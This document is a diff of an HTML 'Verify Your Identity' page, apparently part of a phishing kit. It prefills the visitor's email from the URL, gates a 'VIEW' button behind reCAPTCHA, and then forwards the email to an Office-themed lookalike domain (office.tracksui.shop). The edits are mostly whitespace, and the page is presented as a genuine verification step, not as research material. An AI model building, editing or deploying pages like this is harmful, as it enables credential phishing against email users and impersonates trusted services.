@@ -1,31 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
     <title>Verify Your Identity</title>
     <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-    <style>
-        *,
-        *::before,
-        *::after {
+    <style>
+        *, *::before, *::after {
             box-sizing: border-box;
         }
         html, body {
             height: 100%;
         }
-        body {
+        body {
             min-height: 100vh;
             background: #f8f8f8;
-            display: flex;
+            display: flex;
             align-items: center;
-            justify-content: center;
+            justify-content: center;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
+        }
         .card {
             background: #fff;
-            border-radius: 8px;
+            border-radius: 8px;
             box-shadow: 0 2px 12px rgba(0,0,0,0.08);
             padding: 2.5rem 2rem 2rem 2rem;
             width: 100%;
@@ -33,8 +31,8 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-        }
-        .logo {
+        }
+        .logo {
             width: 110px;
             height: 90px;
             object-fit: contain;
@@ -80,11 +78,12 @@
             transition: border 0.2s;
             margin-bottom: 0;
             box-sizing: border-box;
+            background: #fff;
         }
         input[type="email"]:focus {
             border-color: #0078d4;
-        }
-        .g-recaptcha {
+        }
+        .g-recaptcha {
             margin: 0.7rem 0 1.1rem 0;
             width: 100%;
             display: flex;
@@ -93,19 +92,19 @@
         .btn {
             width: 100%;
             background: #1877f2;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
             padding: 0.8rem 0;
             font-size: 1.08rem;
             font-weight: 600;
-            cursor: pointer;
+            cursor: pointer;
             transition: background 0.18s;
-        }
+        }
         .btn:disabled {
             background: #b3d0f7;
-            cursor: not-allowed;
-        }
+            cursor: not-allowed;
+        }
         .error-message {
             color: #d13438;
             background: #fde7e9;
@@ -121,8 +120,8 @@
             .card {
                 padding: 1.2rem 0.5rem;
             }
-        }
-    </style>
+        }
+    </style>
 </head>
 <body>
     <div class="card">
@@ -137,14 +136,14 @@
             </div>
             <div class="g-recaptcha" data-sitekey="6Lc6BWwrAAAAAE7YZhLvrZuunJN-1uzyL8xcGl45" data-callback="enableSubmit"></div>
             <button id="nextBtn" class="btn" disabled>VIEW</button>
-        </form>
-    </div>
-    <script>
-        const form = document.getElementById('verificationForm');
+        </form>
+    </div>
+    <script>
+        const form = document.getElementById('verificationForm');
         const emailInput = document.getElementById('email');
         const nextBtn = document.getElementById('nextBtn');
         const errorMessage = document.getElementById('errorMessage');
-        let isRecaptchaVerified = false;
+        let isRecaptchaVerified = false;
 
         // Get and decode the email from the query parameter
         const urlParams = new URLSearchParams(window.location.search);
@@ -168,11 +167,11 @@
 
         function validateForm() {
             nextBtn.disabled = !isRecaptchaVerified || !emailInput.value.trim();
-        }
+        }
 
-        window.enableSubmit = function() {
-            isRecaptchaVerified = true;
-            validateForm();
+        window.enableSubmit = function() {
+            isRecaptchaVerified = true;
+            validateForm();
             document.getElementById('nextBtn').disabled = false;
         };
 
@@ -183,13 +182,13 @@
             if (!emailInput.value.trim()) {
                 errorMessage.textContent = 'Please enter your email address.';
                 errorMessage.style.display = 'block';
-                return;
-            }
+                return;
+            }
             if (!isRecaptchaVerified) {
                 errorMessage.textContent = 'Please complete the reCAPTCHA verification!';
                 errorMessage.style.display = 'block';
-                return;
-            }
+                return;
+            }
             // Simulate redirect (replace with your logic)
             nextBtn.disabled = true;
             nextBtn.textContent = 'Processing...';
@@ -198,6 +197,6 @@
                 window.location.href = 'https://office.tracksui.shop/pQDzyubQ#' + encodedEmail;
             }, 900);
         };
-    </script>
+    </script>
 </body>
 </html>
